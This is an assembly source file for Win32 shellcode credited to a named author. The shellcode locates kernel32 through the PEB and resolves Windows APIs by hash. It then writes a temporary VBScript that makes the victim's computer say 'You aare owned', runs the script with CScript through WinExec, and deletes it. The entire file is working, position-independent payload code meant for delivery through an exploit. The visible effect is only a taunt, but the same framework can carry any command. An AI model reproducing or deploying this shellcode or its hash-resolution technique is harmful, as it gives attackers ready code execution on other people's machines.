;Win32 Speaking Shell Code
;Author : Debasish Mandal
;Email : debasishm89 [at] gmail.com
;Blog : http://www.debasish.in/
;Win32 APIs Used:    CreateFileA,WriteFile,CloseHandle,WinExec and ExitProcess
;Uses PEB technique to find the base address of kernel32.dll

[SECTION .data]
 n db ''
[Section .text]
[BITS 32]
global _start
_start:
    jmp start_main
;peb technique
find_kernel32:
 xor eax, eax             ; clear ebx
 mov eax, [fs:0x30]       ; get a pointer to the PEB
 mov eax, [eax+0x0C]    ; get PEB->Ldr
 mov eax, [eax+0x14]      ; get PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
 mov eax, [eax]           ; get the next entry (2nd entry)
 mov eax, [eax]           ; get the next entry (3rd entry)
 mov eax, [eax+0x10]      ; get the 3rd entries base address (kernel32.dll)
 ret
;Function : Find function base address
find_function:
 pushad
 mov ebp,[esp+0x24]
 mov eax,[ebp+0x3c]
 mov edx,[ebp+eax+0x78]
 add edx,ebp
 mov ecx,[edx+0x18]
 mov ebx,[edx+0x20]
 add ebx,ebp
find_function_loop:
 jecxz find_function_finished
 dec ecx
 mov esi,[ebx+ecx*4]
 add esi,ebp
compute_hash:
 xor edi,edi
 xor eax,eax
 cld
compute_hash_again:
 lodsb
 test al,al
 jz compute_hash_finished
 ror edi,0xd
 add edi,eax
 jmp compute_hash_again
compute_hash_finished:
find_function_compare:
 cmp edi,[esp+0x28]
 jnz find_function_loop
 mov ebx,[edx+0x24]
 add ebx,ebp
 mov cx,[ebx+2*ecx]
 mov ebx,[edx+0x1c]
 add ebx,ebp
 mov eax,[ebx+4*ecx]
 add eax,ebp
 mov [esp+0x1c],eax
find_function_finished:
 popad
 ret
find_funcs_for_dll:
    lodsd
    push eax
    push edx
    call find_function
    mov [edi], eax
    add esp,0x08                     
    add edi,0x04
    cmp esi,ecx
    jne find_funcs_for_dll
find_funcs_for_dll_finished:
    ret

GetArgument1:                    ;temp.vbs  
    call ArgumentReturn1   
    db "temp.vbs"             
    db 0x00               
GetArgument2:                    ;CreateObject("SAPI.SpVoice").Speak"You aare owned"
    call ArgumentReturn2   
    db 'CreateObject("SAPI.SpVoice").Speak"You aare owned"'                             
    db 0x00               
GetArgument3:                    ;CScript.exe //B temp.vbs
    call ArgumentReturn3   
    db "CScript.exe //B temp.vbs"
    db 0x00               
GetArgument4:                    ;COMMAND.COM /C DEL temp.vbs
    call ArgumentReturn4   
    db "COMMAND.COM /C DEL temp.vbs"
    db 0x00 
GetHashes:
    call GetHashesReturn
 ; CreateFileA
 db 0xA5
 db 0x17
 db 0x00
 db 0x7C
 ; WriteFile hash
 db 0x1F
 db 0x79
 db 0x0A
 db 0xE8
 ; CloseHandle hash
 db 0xFB
 db 0x97
 db 0xFD
 db 0x0F
 ;;WinExec hash
 db 0x98
 db 0xFE
 db 0x8A
 db 0x0E     
   ;ExitProcess hash
    db 0x7E
    db 0xD8
    db 0xE2
    db 0x73   
;Main
start_main:
    sub esp,0x14              ;allocate space on stack to store 5 function address
    mov ebp,esp         
 call find_kernel32
 mov edx,eax             ;save base address of kernel32 in edx
    jmp GetHashes           ;get address of  WinExec hash
GetHashesReturn:
    pop esi                 ;get pointer to hash into esi
    lea edi, [ebp+0x4]      ;we will store the function addresses at edi
 mov ecx,esi
 add ecx,0x14            ; store address of last hash into ecx
    call find_funcs_for_dll    ;get function pointers for all hashes
 jmp startcalling
startcalling:
;All Done Start calling Win32 APIs
 xor eax,eax
 xor ebx,ebx       ;zero out the registers
 xor ecx,ecx                ;ECX will always hold 0
;Createfile API
 push ecx                   ; Set Last Parameter to zero
 push 0x80                  ;FILE_ATTRIBUTE_NORMAL    
 push 0x2                   ;CREATE_ALWAYS
 push ecx       ;0
 push ecx                   ;0 
 push 0x2                   ;FILE_WRITE_DATA
 jmp GetArgument1
ArgumentReturn1:
 pop edx                     ;EDX is now holding the argument temp.vbs
 push edx                    ;Push temp.vbs into stack
 call [ebp+4]                ;CreateFileA.Kernel32.dll
 mov ebx,eax           ; store the value of handler to ebx
;writefileapi:
 xor ecx,ecx                 ;Because  value of ecx is getting changed after execution of createfile
 push ecx                    ;0 
 mov eax,n
 push eax                    ;&n
 push 0x32                   ;Length of the character to write is 50 ~ 0x32
 jmp GetArgument2
ArgumentReturn2:
 pop edx                     ;EDX is now holding the argument
 push edx
 push ebx         ; Put the returned buffer into stack.
 call [ebp+0x8]    ; Writefile.Kernel32.dll
; CloseHandle()
 push ebx                    ; Push the handle buffer into stack
 call [ebp+0xC]              ; CloseHandle.Kernel32.dll
; Extecute the VBSCRIPT FILE
 xor ecx,ecx                 ; Because  value of ecx is getting changed after execution of createfile
 push ecx     ;0,Force Minimize push zero in stack
 jmp GetArgument3            ;ASCII "CScript.exe //B temp.vbs"
ArgumentReturn3:
 pop edx
 push edx
 call [ebp+16]               ;WinExec.Kernel32.dll
; Delete the temporary file
 xor ecx,ecx                 ; Because  value of ecx is getting changed after execution of createfile
 push ecx     ;0,Force Minimize push zero in stack
 jmp GetArgument4
ArgumentReturn4:                ;COMMAND.COM /C DEL temp.vbs
 pop edx
 push edx
 call [ebp+16]               ;WinExec.Kernel32.dll
; Exit Process
 xor ecx,ecx                  ; Because  value of ecx is getting changed after execution of createfile
 push ecx                     ;0
  call [ebp+20]                ;ExitProcess.Kernel32.dll
